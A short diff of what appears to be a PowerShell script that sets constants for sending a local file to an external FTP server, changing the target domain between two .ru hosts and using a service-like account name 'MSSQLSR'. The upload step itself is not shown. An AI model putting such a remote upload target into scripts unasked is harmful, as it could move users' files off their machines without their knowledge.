@@ -9,7 +9,7 @@
 
 ### Set Constants
 $prefixc = "ftp"
-$domainc = "linserver.anticriminalonline.ru"
+$domainc = "lare.tuneserv.ru"
 $portc = 21
 $serverdirc = "/tmp/Files/"
 $userc = "MSSQLSR"
@@ -32,7 +32,7 @@ $urlc = "${prefixc}://${domainc}:$portc$serverdirc$localfilename"
 # Популярное решение "устранения" ошибки: Exception setting "OutputEncoding": "The handle is invalid."
 & cmd /c ver | Out-Null
 
-$encoding = [Console]::OutputEncoding 
+$encoding = [Console]::OutputEncoding
 [Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("cp866")
 try
 {
